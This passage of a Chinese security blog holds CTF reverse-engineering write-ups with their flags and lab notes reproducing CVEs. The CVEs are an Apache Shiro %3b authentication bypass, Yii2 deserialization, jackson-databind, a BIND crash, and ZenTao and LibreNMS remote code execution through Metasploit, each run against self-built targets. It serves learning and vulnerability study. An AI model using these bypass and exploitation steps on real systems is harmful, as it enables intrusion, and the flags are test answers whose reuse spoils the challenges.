<p><img src="/2021/01/18/0x06buuctfWP-1/image-20210112173435652.png" alt="image-20210112173435652"></p>
<p>进入这个函数，特别长，3000行，反编译需要久一点，可以看出我们输入的字符经过一大堆异或操作，最后和规定的字符对比，同时不符合的话会返回错误信息，可以知道错误在第几位，因此可以选择爆破</p>
<p><img src="/2021/01/18/0x06buuctfWP-1/image-20210112173225058.png" alt="image-20210112173225058"></p>
<p>学习python爆破</p>
<p>利用pwn和re正则</p>
<p>re：</p>
<p><a href="https://www.cnblogs.com/python-xkj/archive/2018/06/26/9231624.html">https://www.cnblogs.com/python-xkj/archive/2018/06/26/9231624.html</a></p>
<p><img src="/2021/01/18/0x06buuctfWP-1/image-20210112173704852.png" alt="image-20210112173704852"></p>
<p>pwn库：</p>
<p><a href="https://github.com/Gallopsled/pwntools-tutorial/blob/master/tubes.md#receiving-data">https://github.com/Gallopsled/pwntools-tutorial/blob/master/tubes.md#receiving-data</a></p>
<p><a href="http://docs.pwntools.com/en/latest/">http://docs.pwntools.com/en/latest/</a></p>
<p>基本输入输出：</p>
<p><img src="/2021/01/18/0x06buuctfWP-1/image-20210112173902013.png" alt="image-20210112173902013"></p>
<p>运行脚本即可得到flag</p>
<p><img src="/2021/01/18/0x06buuctfWP-1/image-20210112172937305.png" alt="image-20210112172937305"></p>
<h5 id="0x08-MRCTF2020-PixelShooter（unity-安卓）2021-1-13"><a href="#0x08-MRCTF2020-PixelShooter（unity-安卓）2021-1-13" class="headerlink" title="0x08 [MRCTF2020]PixelShooter（unity/安卓）2021.1.13"></a>0x08 [MRCTF2020]PixelShooter（unity/安卓）2021.1.13</h5><p>下载下来是一个apk，运行了下发现是个游戏</p>
<p><img src="/2021/01/18/0x06buuctfWP-1/image-20210113170627702.png" alt="image-20210113170627702"></p>
<p>看来flag就是要打到一定的分数</p>
<p>用apktool反编译，找了下关键语句，发现并没有，陷入僵局</p>
<p><img src="/2021/01/18/0x06buuctfWP-1/image-20210113170709008.png" alt="image-20210113170709008"></p>
<p>搜索了下unity相关信息：<a href="https://blog.csdn.net/weixin_44058342/article/details/87940908">https://blog.csdn.net/weixin_44058342/article/details/87940908</a></p>
<p>原来unity的数据一般存在别的地方</p>
<p>用apktoolbox对apk进行反编译，提取出 game/assets/bin/data/Managed/Assembly-CSarp.dll，使用 ILSpy 打开即可看到dll，然后搜索flag关键词，找到对应点</p>
<p><img src="/2021/01/18/0x06buuctfWP-1/image-20210113171010243.png" alt="image-20210113171010243"></p>
<p>然后就能找到flag了</p>
<p><img src="/2021/01/18/0x06buuctfWP-1/image-20210113171034487.png" alt="image-20210113171034487"></p>
<p>是个简单题了</p>
<h5 id="0x09-FlareOn1-Bob-Doge-2021-1-18"><a href="#0x09-FlareOn1-Bob-Doge-2021-1-18" class="headerlink" title="0x09 [FlareOn1]Bob Doge 2021.1.18"></a>0x09 [FlareOn1]Bob Doge 2021.1.18</h5><p>打开，是个.net文件</p>
<p>运行一下，发现要求我们解密这串字符串</p>
<p><img src="/2021/01/18/0x06buuctfWP-1/image-20210118155431597.png" alt="image-20210118155431597"></p>
<p>使用dnspy反编译，找到main函数</p>
<p><img src="/2021/01/18/0x06buuctfWP-1/image-20210118154848447.png" alt="image-20210118154848447"></p>
<p>跟进form1，定义了一个加密的按钮</p>
<p><img src="/2021/01/18/0x06buuctfWP-1/image-20210118154955211.png" alt="image-20210118154955211"></p>
<p>查看按钮功能定义，是对一个dat_secret字符串的加密操作</p>
<p><img src="/2021/01/18/0x06buuctfWP-1/image-20210118155028582.png" alt="image-20210118155028582"></p>
<p>在资源里我们可以看到这个字符串，31字节</p>
<p><img src="/2021/01/18/0x06buuctfWP-1/image-20210118155120940.png" alt="image-20210118155120940"></p>
<p><img src="/2021/01/18/0x06buuctfWP-1/image-20210118155142916.png" alt="image-20210118155142916"></p>
<p>一开始看的这个字符串，把前面5个字节也算进去了，后来发现前5个字节是一些定义</p>
<p><img src="/2021/01/18/0x06buuctfWP-1/image-20210118160846527.png" alt="image-20210118160846527"></p>
<p><img src="/2021/01/18/0x06buuctfWP-1/image-20210118160832519.png" alt="image-20210118160832519"></p>
<p>编写脚本：可以得知flag为text的内容，对text进行了两次加密操作最后输出的是text3</p>
<p><img src="/2021/01/18/0x06buuctfWP-1/image-20210118155516823.png" alt="image-20210118155516823"></p>
<p>还有一种就是可以在程序上下断点，直接跑，但是我虚拟机上没有.net3服务所以跑不了…….</p>
<h5 id="0x0A-FlareOn5-Ultimate-Minesweeper-2021-1-19"><a href="#0x0A-FlareOn5-Ultimate-Minesweeper-2021-1-19" class="headerlink" title="0x0A [FlareOn5]Ultimate Minesweeper 2021.1.19"></a>0x0A [FlareOn5]Ultimate Minesweeper 2021.1.19</h5><p>打开，发现又是个.net的文件，运行后发现是个扫雷游戏</p>
<p>dnspy反编译一下</p>
<p>主函数：</p>
<p><img src="/2021/01/18/0x06buuctfWP-1/image-20210119110433175.png" alt="image-20210119110433175"></p>
<p>找到了判定的函数：</p>
<p><img src="/2021/01/18/0x06buuctfWP-1/image-20210119110525343.png" alt="image-20210119110525343"></p>
<p>看到一个getkey函数，猜测就是生成flag的函数，给了一个数组和一些操作</p>
<p><img src="/2021/01/18/0x06buuctfWP-1/image-20210119110615575.png" alt="image-20210119110615575"></p>
<p>按照逻辑编了下脚本，跑出来发现不对</p>
<p><img src="/2021/01/18/0x06buuctfWP-1/image-20210119110834746.png" alt="image-20210119110834746"></p>
<p>然后下断点，看生成的array2的值，然后尝试转换成ascii码，还是不对</p>
<p>那就调试从判定的地方直接跳到成功界面好了，还是不行</p>
<p><img src="/2021/01/18/0x06buuctfWP-1/image-20210119111206877.png" alt="image-20210119111206877"></p>
<p>此时转换思路，干脆从生成的时候看看哪三个格子不是雷，直接通关好了</p>
<p>开始找初始生成函数：</p>
<p>Initialize函数生成初始界面</p>
<p>minefield生成了30*30</p>
<p>allocatememory里面有一个garbage collect</p>
<p><img src="/2021/01/18/0x06buuctfWP-1/image-20210119111455340.png" alt="image-20210119111455340"></p>
<p>跟进去看是存储是否存在雷的判定值</p>
<p><img src="/2021/01/18/0x06buuctfWP-1/image-20210119111427423.png" alt="image-20210119111427423"></p>
<p>下断点，查看garbagecollect的值，在一堆true当中找到3个false的对应坐标记录，然后尝试一下纵横的区别即可（调试两次发现生成的位置的值是固定的</p>
<p><img src="/2021/01/18/0x06buuctfWP-1/image-20210119111932177.png" alt="image-20210119111932177"></p>
<p>通关即可得到flag</p>
<p><img src="/2021/01/18/0x06buuctfWP-1/image-20210119110300267.png" alt="image-20210119110300267"></p>
<h5 id="0x0B-GKCTF2020-Chelly’s-identity-2021-1-19"><a href="#0x0B-GKCTF2020-Chelly’s-identity-2021-1-19" class="headerlink" title="0x0B [GKCTF2020]Chelly’s identity 2021.1.19"></a>0x0B [GKCTF2020]Chelly’s identity 2021.1.19</h5><p>这是我目前见过最恶心的题目，函数一个套一个都不知道是什么功能….全靠猜</p>
<p>放到ida里看看字符串</p>
<p><img src="/2021/01/18/0x06buuctfWP-1/image-20210119180742285.png" alt="image-20210119180742285"></p>
<p>找到对应主函数位置：</p>
<p><img src="/2021/01/18/0x06buuctfWP-1/image-20210119180823199.png" alt="image-20210119180823199"></p>
<p>输入的字符串存到v35，定义了一个16位的v34空数组</p>
<p>可以猜测是把v35给了v34，然后对v34进行4111BD函数操作和411721函数操作，然后用411852函数做判断</p>
<p>进入4111BD函数看看：</p>
<p><img src="/2021/01/18/0x06buuctfWP-1/image-20210119181207625.png" alt="image-20210119181207625"></p>
<p>通过16和bad long，可以猜测是判断长度</p>
<p>进入411721函数：</p>
<p><img src="/2021/01/18/0x06buuctfWP-1/image-20210119181252726.png" alt="image-20210119181252726"></p>
<p>可以看到定义了一个v10，长度还是16位，4116E0函数对v10和128数字进行了一些操作，v9是我们输入的字符串</p>
<p>进入4116E0函数：</p>
<p><img src="/2021/01/18/0x06buuctfWP-1/image-20210119181546277.png" alt="image-20210119181546277"></p>
<p>定义了一个v6数组，长16位，然后在2-128之间，对i做了一个411672的函数判断，然后把i存到数组里</p>
<p>411672函数功能：</p>
<p>研究了一下发现是判断质数（a2%i</p>
<p><img src="/2021/01/18/0x06buuctfWP-1/image-20210119181647509.png" alt="image-20210119181647509"></p>
<p>在411721函数下面的循环里，就可以简化一下理解</p>
<p><img src="/2021/01/18/0x06buuctfWP-1/image-20210119181453477.png" alt="image-20210119181453477"></p>
<p>然后进入411852判断函数：</p>
<p><img src="/2021/01/18/0x06buuctfWP-1/image-20210119180607388.png" alt="image-20210119180607388"></p>
<p>已知了操作算法和操作完后的数值，就可以编写脚本了</p>
<p><img src="/2021/01/18/0x06buuctfWP-1/image-20210120114006207.png" alt="image-20210120114006207"></p>
]]></content>
      <categories>
        <category>ctf</category>
      </categories>
  </entry>
  <entry>
    <title>0x07cve-2020-13933复现</title>
    <url>/2020/10/23/0x07cve-2020-13933%E5%A4%8D%E7%8E%B0/</url>
    <content><![CDATA[<h4 id="cve-2020-13933：Apache-shiro-权限绕过漏洞复现"><a href="#cve-2020-13933：Apache-shiro-权限绕过漏洞复现" class="headerlink" title="cve-2020-13933：Apache shiro 权限绕过漏洞复现"></a>cve-2020-13933：Apache shiro 权限绕过漏洞复现</h4><p>这个复现非常简单，先用IDEA+shiro搭环境</p>
<p>参考：<a href="https://www.cnblogs.com/ph4nt0mer/p/13535999.html">https://www.cnblogs.com/ph4nt0mer/p/13535999.html</a></p>
<a id="more"></a>

<p>然后运行，访问，抓包即可</p>
<p><img src="/2020/10/23/0x07cve-2020-13933%E5%A4%8D%E7%8E%B0/image-20200923095122117.png" alt="image-20200923095122117"></p>
<p>访问test，成功</p>
<p><img src="/2020/10/23/0x07cve-2020-13933%E5%A4%8D%E7%8E%B0/image-20200922183129207.png" alt="image-20200922183129207"></p>
<p>要越权访问test文件夹下的内容，跳转到登录界面</p>
<p><img src="/2020/10/23/0x07cve-2020-13933%E5%A4%8D%E7%8E%B0/image-20200922183151071.png" alt="image-20200922183151071"></p>
<p>进行%3b的操作，绕过登录访问到了页面内容</p>
<p><img src="/2020/10/23/0x07cve-2020-13933%E5%A4%8D%E7%8E%B0/image-20200922183207361.png" alt="image-20200922183207361"></p>
]]></content>
      <categories>
        <category>漏洞复现</category>
      </categories>
      <tags>
        <tag>apaches shiro</tag>
      </tags>
  </entry>
  <entry>
    <title>0x08cve-2020-15148 Yii2反序列化漏洞复现</title>
    <url>/2020/10/26/0x08cve-2020-15148-Yii2%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/</url>
    <content><![CDATA[<h4 id="cve-2020-15148-Yii2反序列化漏洞复现"><a href="#cve-2020-15148-Yii2反序列化漏洞复现" class="headerlink" title="cve-2020-15148 Yii2反序列化漏洞复现"></a>cve-2020-15148 Yii2反序列化漏洞复现</h4><p>参考：</p>
<p><a href="https://xz.aliyun.com/t/8307?page=5">https://xz.aliyun.com/t/8307?page=5</a></p>
<p><a href="https://www.cnblogs.com/2rsh0u/p/13714923.html">https://www.cnblogs.com/2rsh0u/p/13714923.html</a></p>
<a id="more"></a>

<h5 id="0x1-安装Yii2"><a href="#0x1-安装Yii2" class="headerlink" title="0x1 安装Yii2"></a>0x1 安装Yii2</h5><p>到Github上下载了对应的漏洞版本(<a href="https://github.com/yiisoft/yii2/releases),%E6%AD%A4%E5%A4%84%E4%B8%8B%E8%BD%BD%E4%BA%86yii-basic-app-2.0.37.tgz">https://github.com/yiisoft/yii2/releases),此处下载了yii-basic-app-2.0.37.tgz</a></p>
<p>打开文件，本来想看参考文章里的复现的，奈何win下的环境搞不好，刚好看到文件夹里有docker-compose文件，便去官方文档看了下docker的安装(<a href="https://www.yiichina.com/doc/guide/2.0/start-installation">https://www.yiichina.com/doc/guide/2.0/start-installation</a>)</p>
<p>进入对应文件夹然后启动：docker-compose up</p>
<p><img src="/2020/10/26/0x08cve-2020-15148-Yii2%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/image-20201027150136028.png" alt="image-20201027150136028"></p>
<p>然后找到了对应的web页面访问地址</p>
<p><img src="/2020/10/26/0x08cve-2020-15148-Yii2%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/image-20201027150317471.png" alt="image-20201027150317471"></p>
<p>这样就搭建成功了</p>
<p><img src="/2020/10/26/0x08cve-2020-15148-Yii2%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/image-20201027133934882.png" alt="image-20201027133934882"></p>
<p>注意：要写入config文件夹中的web.php中的cookieValidationKey字段的值，不然会报错</p>
<p><img src="/2020/10/26/0x08cve-2020-15148-Yii2%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/image-20201027152240894.png" alt="image-20201027152240894"></p>
<h5 id="0x2-漏洞复现"><a href="#0x2-漏洞复现" class="headerlink" title="0x2 漏洞复现"></a>0x2 漏洞复现</h5><p>第一次复现PHP的漏洞，还是有很多懵的地方,一开始看到这个poc和别人的复现记录我都不知道如何操作</p>
<p>poc：</p>
<p><img src="/2020/10/26/0x08cve-2020-15148-Yii2%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/image-20201027151142665.png" alt="image-20201027151142665"></p>
<p>看到这个Php文件最后输出一个base64加密的字符串</p>
<p><strong>可以放到菜鸟的php在线工具(或者其他的Php在线编辑器：<a href="https://tool.lu/coderunner/)%E8%BF%90%E8%A1%8C%EF%BC%8C%E5%A4%8D%E5%88%B6%E7%94%9F%E6%88%90%E7%9A%84%E5%AD%97%E7%AC%A6%E4%B8%B2%E5%8D%B3%E5%8F%AF">https://tool.lu/coderunner/)运行，复制生成的字符串即可</a></strong></p>
<p><img src="/2020/10/26/0x08cve-2020-15148-Yii2%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/image-20201027152049055.png" alt="image-20201027152049055"></p>
<p>然后在controllers下创建一个反序列化的入口TestController.php</p>
<p><img src="/2020/10/26/0x08cve-2020-15148-Yii2%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/image-20201027152429860.png" alt="image-20201027152429860"></p>
<p>然后抓包，改包，将字符串放进去，重新发送，即可看到POC内的攻击命令被运行了，命令可自己改</p>
<p><img src="/2020/10/26/0x08cve-2020-15148-Yii2%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/image-20201027144713425.png" alt="image-20201027144713425"></p>
]]></content>
      <categories>
        <category>漏洞复现</category>
      </categories>
      <tags>
        <tag>yii2</tag>
      </tags>
  </entry>
  <entry>
    <title>0x09CVE-2020-11113复现</title>
    <url>/2020/10/30/0x09CVE-2020-11113%E5%A4%8D%E7%8E%B0/</url>
    <content><![CDATA[<h4 id="CVE-2020-11113复现"><a href="#CVE-2020-11113复现" class="headerlink" title="CVE-2020-11113复现"></a>CVE-2020-11113复现</h4><p>复现参考：<a href="https://blog.csdn.net/mukami0621/article/details/108447493">https://blog.csdn.net/mukami0621/article/details/108447493</a></p>
<p>这两个漏洞复现方式很像…</p>
<a id="more"></a>

<p>POC:<a href="https://github.com/Al1ex/CVE-2020-11113">https://github.com/Al1ex/CVE-2020-11113</a></p>
<p>项目里已经搭好了环境，其实应该按之前复现过的24616流程，稍微改改POC内容即可</p>
<p>复现成功结果：</p>
<p><img src="/2020/10/30/0x09CVE-2020-11113%E5%A4%8D%E7%8E%B0/image-20201102140016594.png" alt="image-20201102140016594"></p>
<p>出现的问题：</p>
<p>1、有一个包无法下载</p>
<p>解决：<a href="https://mvnrepository.com,自行下载导入(虽然官网的验证蛮烦的/">https://mvnrepository.com，自行下载导入（虽然官网的验证蛮烦的</a></p>
<p>2、和24616不一样，恶意类发送了但是不知道为啥计算器弹不出来…</p>
]]></content>
      <categories>
        <category>漏洞复现</category>
      </categories>
  </entry>
  <entry>
    <title>0x0ACVE-2020-8617复现</title>
    <url>/2020/11/03/0x0ACVE-2020-8617%E5%A4%8D%E7%8E%B0/</url>
    <content><![CDATA[<h4 id="CVE-2020-8617复现"><a href="#CVE-2020-8617复现" class="headerlink" title="CVE-2020-8617复现"></a>CVE-2020-8617复现</h4><p>参考：<a href="https://github.com/knqyf263/CVE-2020-8617">https://github.com/knqyf263/CVE-2020-8617</a></p>
<a id="more"></a>

<p>0x1 下载docker镜像后运行（服务器环境）</p>
<p><img src="/2020/11/03/0x0ACVE-2020-8617%E5%A4%8D%E7%8E%B0/image-20201110095624465.png" alt="image-20201110095624465"></p>
<p><img src="/2020/11/03/0x0ACVE-2020-8617%E5%A4%8D%E7%8E%B0/image-20201103142215582.png" alt="image-20201103142215582"></p>
<p>0x2 安装pipenv</p>
<p><img src="/2020/11/03/0x0ACVE-2020-8617%E5%A4%8D%E7%8E%B0/image-20201110095701235.png" alt="image-20201110095701235"></p>
<p>0x3 因为已经有pipfile.lock文件，所以运行脚本会自动安装依赖，可以看到运行脚本之后服务器就崩溃了</p>
<p><img src="/2020/11/03/0x0ACVE-2020-8617%E5%A4%8D%E7%8E%B0/image-20201103143139388.png" alt="image-20201103143139388"></p>
<p>0x4 流量包情况</p>
<p><img src="/2020/11/03/0x0ACVE-2020-8617%E5%A4%8D%E7%8E%B0/image-20201103145742284.png" alt="image-20201103145742284"></p>
]]></content>
      <categories>
        <category>漏洞复现</category>
      </categories>
      <tags>
        <tag>pipenv</tag>
      </tags>
  </entry>
  <entry>
    <title>0x0BCve-2020-7361 禅道远程代码执行漏洞复现</title>
    <url>/2020/11/05/0x0BCve-2020-7361-%E7%A6%85%E9%81%93%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/</url>
    <content><![CDATA[<h4 id="0x0B-Cve-2020-7361-禅道远程代码执行漏洞复现"><a href="#0x0B-Cve-2020-7361-禅道远程代码执行漏洞复现" class="headerlink" title="0x0B Cve-2020-7361 禅道远程代码执行漏洞复现"></a>0x0B Cve-2020-7361 禅道远程代码执行漏洞复现</h4><p>poc：<a href="https://github.com/rapid7/metasploit-framework/pull/13828">https://github.com/rapid7/metasploit-framework/pull/13828</a></p>
<a id="more"></a>

<h5 id="0x1-准备攻击机环境"><a href="#0x1-准备攻击机环境" class="headerlink" title="0x1 准备攻击机环境"></a>0x1 准备攻击机环境</h5><p>看到这个POC，发现是加入到metasploit模块里</p>
<p>打开kali，学习了一下<strong>metasploit加入自定义模块</strong></p>
<p>​    准备好后缀为rb的文件-&gt;usr-&gt;share-&gt;metasploit-framework-&gt;modules-&gt;exploits</p>
<p>​    在里面可以自己创一个新的文件夹，也可以直接放到任意一个文件夹下</p>
<p>​    然后在终端里：msfconsole打开-&gt;reload_all即可导入模块</p>
<h5 id="0x2-准备靶机环境"><a href="#0x2-准备靶机环境" class="headerlink" title="0x2 准备靶机环境"></a>0x2 准备靶机环境</h5><p>到禅道官网下载对应版本的一键安装包：<a href="https://www.zentao.net/download.html">https://www.zentao.net/download.html</a></p>
<p>我这里下载的是8.8.1的版本，放在了D盘</p>
<p>然后在win10的环境下安装，运行（一定要解压缩在磁盘的根目录下</p>
<p>修改了端口为8099，因为80被占用了</p>
<p><img src="/2020/11/05/0x0BCve-2020-7361-%E7%A6%85%E9%81%93%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/image-20201105135400652.png" alt="image-20201105135400652"></p>
<p>点击访问之后需要修改下数据库密码，然后用admin/123456默认密码登入页面，修改密码为zentao123即可</p>
<p>靶机环境就准备好了</p>
<h5 id="0x3-漏洞复现"><a href="#0x3-漏洞复现" class="headerlink" title="0x3 漏洞复现"></a>0x3 漏洞复现</h5><p>查看攻击机的IP（LHOST）和靶机的IP（RHOST）并记录，同时确保攻击机和靶机能通信，即攻击机可以用http://靶机IP/pro/login.html访问到禅道的页面</p>
<p>在msf对各个参数进行设定，LHOST，RHOST，PASSWORD，RPORT</p>
<p><img src="/2020/11/05/0x0BCve-2020-7361-%E7%A6%85%E9%81%93%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/image-20201105140022697.png" alt="image-20201105140022697"></p>
<p>然后run，就可以看到打成功了，可以得到目标靶机的信息，利用meterpreter可以上传文件下载文件等等，常用命令：<a href="https://blog.csdn.net/qq_34841823/article/details/54926500">https://blog.csdn.net/qq_34841823/article/details/54926500</a></p>
<p><img src="/2020/11/05/0x0BCve-2020-7361-%E7%A6%85%E9%81%93%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/image-20201105140344931.png" alt="image-20201105140344931"></p>
<p>抓取的重点流量包：</p>
<p><img src="/2020/11/05/0x0BCve-2020-7361-%E7%A6%85%E9%81%93%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/image-20201105142158502.png" alt="image-20201105142158502"></p>
<h5 id="出现的问题："><a href="#出现的问题：" class="headerlink" title="出现的问题："></a>出现的问题：</h5><h5 id="0x01-攻击机和靶机在同一网段，能Ping通，但是无法访问对应页面"><a href="#0x01-攻击机和靶机在同一网段，能Ping通，但是无法访问对应页面" class="headerlink" title="0x01 攻击机和靶机在同一网段，能Ping通，但是无法访问对应页面"></a>0x01 攻击机和靶机在同一网段，能Ping通，但是无法访问对应页面</h5><p>解决方法：</p>
<p>是8099端口未开放的问题，在防火墙规则里添加一条自定义的入站规则即可，开放8099的权限</p>
<h5 id="0x02-POC无法打成功，原因未知，一直卡在sending-stage阶段，msf是4的版本"><a href="#0x02-POC无法打成功，原因未知，一直卡在sending-stage阶段，msf是4的版本" class="headerlink" title="0x02 POC无法打成功，原因未知，一直卡在sending stage阶段，msf是4的版本"></a>0x02 POC无法打成功，原因未知，一直卡在sending stage阶段，msf是4的版本</h5><p>解决方法：</p>
<p>重新装了一个kali2018，并且用官方更新源更新了msf到了msf6，发现zentao这个漏洞的模块已经写入了，直接利用就打成功了（计算机真是个玄学</p>
<p>​    msf更新后无法启动成功：gem install bundler:2.1.4（根据提示的版本更新</p>
<p>​    新装的Kali需要做的操作：</p>
<p>​        0x001 修改分配的运行内存，默认可能是512M，这样会很卡，修改后分配了2G</p>
<p>​        0x002 修改/etc/apt/source.list，添加更新源，官方或者其他的</p>
<p>​        0x003 修改/etc/network/interfaces ，添加语句 auto eth0和iface eth0 inet dhcp，然后重启网络/etc/init.d/networking restart</p>
<p>​        0x004 修改/etc/resolv.conf，添加语句nameserver 8.8.8.8等</p>
]]></content>
      <categories>
        <category>漏洞复现</category>
      </categories>
      <tags>
        <tag>kali</tag>
        <tag>metasploit</tag>
      </tags>
  </entry>
  <entry>
    <title>0x0EbuuctfWP-2</title>
    <url>/2021/04/18/0x0EbuuctfWP-2/</url>
    <content><![CDATA[<p>0x0EbuuctfWP</p>
<a id="more"></a>

<h5 id="0x01-GKCTF2020-BabyDriver（sys文件，键盘扫描码"><a href="#0x01-GKCTF2020-BabyDriver（sys文件，键盘扫描码" class="headerlink" title="0x01 [GKCTF2020]BabyDriver（sys文件，键盘扫描码"></a>0x01 [GKCTF2020]BabyDriver（sys文件，键盘扫描码</h5><p>一个sys文件，无壳，进ida分析，发现两个特殊字符串</p>
<p><img src="/2021/04/18/0x0EbuuctfWP-2/image-20210418140047135.png" alt="image-20210418140047135"></p>
<p>判断算法：猜测是一个迷宫</p>
<p><img src="/2021/04/18/0x0EbuuctfWP-2/image-20210418140141623.png" alt="image-20210418140141623"></p>
<p><img src="/2021/04/18/0x0EbuuctfWP-2/image-20210418140117787.png" alt="image-20210418140117787"></p>
<p>去看另一个特殊的字符串：是个迷宫无误了</p>
<p><img src="/2021/04/18/0x0EbuuctfWP-2/image-20210418140208701.png" alt="image-20210418140208701"></p>
<p>但是上下左右对应的字符串并不是ascii编码</p>
<p>由于是sys文件，是由键盘过滤驱动获取键盘扫描码来控制上下左右</p>
<p><a href="https://www.supfree.net/search.asp?id=6386">https://www.supfree.net/search.asp?id=6386</a></p>
<p><img src="/2021/04/18/0x0EbuuctfWP-2/image-20210418140357034.png" alt="image-20210418140357034"></p>
<p>最后得出路径为LKKKLLKLKKKLLLKKKLLLLLL，flag就是flag{403950a6f64f7fc4b655dea696997851}</p>
<h5 id="0x02-GKCTF2020-Check-1n"><a href="#0x02-GKCTF2020-Check-1n" class="headerlink" title="0x02 [GKCTF2020]Check_1n"></a>0x02 [GKCTF2020]Check_1n</h5><p>签到题，下载下来是个很有趣的exe</p>
<p><img src="/2021/04/18/0x0EbuuctfWP-2/image-20210418140728735.png" alt="image-20210418140728735"></p>
<p><img src="/2021/04/18/0x0EbuuctfWP-2/image-20210418140901219.png" alt="image-20210418140901219"></p>
<p>先查壳，无壳，拖到ida中找开机密码</p>
<p><img src="/2021/04/18/0x0EbuuctfWP-2/image-20210418140757037.png" alt="image-20210418140757037"></p>
<p><img src="/2021/04/18/0x0EbuuctfWP-2/image-20210418140804734.png" alt="image-20210418140804734"></p>
<p>看到strcmp，合理猜测开机密码就是HelloWorld</p>
<p>果不其然可以登进去了</p>
<p>在桌面看到flag.txt文件，然后发现一串base64，解码，是说去玩方块游戏</p>
<p><img src="/2021/04/18/0x0EbuuctfWP-2/image-20210418141016904.png" alt="image-20210418141016904"></p>
<p>然后打开桌面上的方块游戏，游戏结束flag就出来了</p>
<p><img src="/2021/04/18/0x0EbuuctfWP-2/image-20210418141026120.png" alt="image-20210418141026120"></p>
<p>在ida中也有一串特殊的字符串，但是base64解不开，后来才知道是base58，可以直接解出flag</p>
<h5 id="0x03-V-amp-N2020-公开赛-strangeCpp"><a href="#0x03-V-amp-N2020-公开赛-strangeCpp" class="headerlink" title="0x03 [V&amp;N2020 公开赛]strangeCpp"></a>0x03 [V&amp;N2020 公开赛]strangeCpp</h5><p>无壳，用ida看</p>
<p><img src="/2021/04/18/0x0EbuuctfWP-2/image-20210506152157962.png" alt="image-20210506152157962"></p>
<p>根据关键字符串找到主函数</p>
<p><img src="/2021/04/18/0x0EbuuctfWP-2/image-20210506152146219.png" alt="image-20210506152146219"></p>
<p>没有发现什么异常，但是程序无法跑成功，也无法下断点</p>
<p>在前面的putchar中发现了一段数据</p>
<p><img src="/2021/04/18/0x0EbuuctfWP-2/image-20210506152308299.png" alt="image-20210506152308299"></p>
<p>调用这段数据的函数如下：</p>
<p><img src="/2021/04/18/0x0EbuuctfWP-2/image-20210506152233111.png" alt="image-20210506152233111"></p>
<p>重点在result和红框的异或操作</p>
<p>查看result的生成函数：</p>
<p>有一个小于14549743的值，经过一些操作得到unsigned int类型的v7，赋值给了result，然后result=607052314</p>
<p><img src="/2021/04/18/0x0EbuuctfWP-2/image-20210506152133843.png" alt="image-20210506152133843"></p>
<p>编写脚本：</p>
<p><img src="/2021/04/18/0x0EbuuctfWP-2/image-20210506153448183.png" alt="image-20210506153448183"></p>
<p><img src="/2021/04/18/0x0EbuuctfWP-2/image-20210506153608511.png" alt="image-20210506153608511"></p>
<p>所以flag是e10adc3949ba59abbe56e057f20f883e</p>
<p>ps:一些常用类型字节数</p>
<p><img src="/2021/04/18/0x0EbuuctfWP-2/image-20210506152014295.png" alt="image-20210506152014295"></p>
]]></content>
      <tags>
        <tag>ctf</tag>
      </tags>
  </entry>
  <entry>
    <title>0x0Ccve-2019-10669</title>
    <url>/2020/11/11/0x0Ccve-2019-10669/</url>
    <content><![CDATA[<h4 id="CVE-2019-10669LibreNMS-命令注入漏洞"><a href="#CVE-2019-10669LibreNMS-命令注入漏洞" class="headerlink" title="CVE-2019-10669LibreNMS 命令注入漏洞"></a>CVE-2019-10669LibreNMS 命令注入漏洞</h4><a id="more"></a>

<p>参考：<a href="https://github.com/cyberghost2h1/metasploit-framework/blob/c833487457be6c16be214048e3fb0e7ef2a23cdf/documentation/modules/exploit/linux/http/librenms_collectd_cmd_inject.md">https://github.com/cyberghost2h1/metasploit-framework/blob/c833487457be6c16be214048e3fb0e7ef2a23cdf/documentation/modules/exploit/linux/http/librenms_collectd_cmd_inject.md</a></p>
<h5 id="0x1-漏洞复现"><a href="#0x1-漏洞复现" class="headerlink" title="0x1 漏洞复现"></a>0x1 漏洞复现</h5><p>这个漏洞的环境也是蛮麻烦的</p>
<p>看到poc发现是集成的msf模块，然后到我的msf里一查，发现已经有了</p>
<p>攻击环境就准备好了</p>
<p>靶机环境：</p>
<p>本来想下软件装，装了好几次不成功</p>
<p>参考：<a href="https://cloud.tencent.com/developer/article/1518046">https://cloud.tencent.com/developer/article/1518046</a></p>
<p>先下一个librenms的ubuntu版直接虚拟机跑</p>
<p>然后根据参考改一下网卡的配置，在主机上访问对应的ip地址和端口就能访问web界面了</p>
<p>此时在kali里跑msf，始终打不成功，看报错是没找到对应的collectd插件</p>
<p>需要在ubuntu换源更新下载安装一条龙</p>
